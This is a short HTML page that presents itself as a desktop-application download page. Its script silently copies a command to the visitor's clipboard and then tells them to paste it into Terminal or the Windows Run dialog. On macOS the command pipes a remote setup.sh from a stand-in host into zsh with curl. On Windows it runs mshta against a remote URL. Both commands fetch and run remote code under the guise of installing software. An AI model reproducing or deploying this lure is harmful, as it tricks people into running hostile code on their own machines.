<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Desktop application download</title></head>
<body>
  <button id="download">Download for your computer</button>
  <section id="mac-help" hidden>
    Open Terminal, paste the copied command, and press Return.
  </section>
  <section id="windows-help" hidden>
    Press Windows Key + R, then press Ctrl + V to paste, and press Enter.
  </section>
  <script>
    const macCommand = 'export STATE_lim=v3.16.6; export _watch_ix=c8ae6d2b; curl -fsS "https://cdn-update.invalid/curl/a44a37519au/setup.sh" | zsh';
    const windowsCommand = 'mshta https://desktop-version.invalid/app';

    document.getElementById('download').addEventListener('click', async () => {
      const macTarget = /Macintosh|Mac OS X/.test(navigator.userAgent);
      const command = macTarget ? macCommand : windowsCommand;
      await navigator.clipboard.writeText(command);
      document.getElementById(macTarget ? 'mac-help' : 'windows-help').hidden = false;
    });
  </script>
</body>
</html>
